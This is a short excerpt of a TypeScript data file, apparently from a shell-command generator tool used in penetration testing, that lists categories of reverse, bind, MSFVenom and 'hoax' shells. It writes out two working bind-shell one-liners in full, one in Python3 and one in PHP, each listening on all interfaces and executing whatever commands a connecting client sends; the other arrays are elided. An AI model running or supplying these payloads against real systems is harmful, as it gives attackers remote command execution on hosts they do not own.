...
export const SHELLS: IShell[] = [
  ...
  { label: 'Bind Shells', value: Shells.BindShell },
  { label: 'MSFVenom Shells', value: Shells.MSFVenomShell },
  { label: 'Hoax Shells', value: Shells.HoaxShell }
]

export const REVERSE_SHELLS: IShellCommand[] = [
  {
    name: 'Bash -i',
...
export const BIND_SHELLS: IShellCommand[] = [
  {
    name: 'Python3 Bind',
    command:
      'python3 -c \'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);\ns1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);\nc.sendall(p.stdout.read()+p.stderr.read())""")\'',
  ...
  },
  {
    name: 'PHP Bind',
    command:
      'php -r \'$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});\nsocket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}\'',
    meta: ['bind', 'mac', 'linux', 'windows'],
    language: 'bash'
  },
  {
...
export const MSFVENOM_SHELLS: IShellCommand[] = [
  {
...
export const HOAX_SHELLS: IShellCommand[] = [
  {
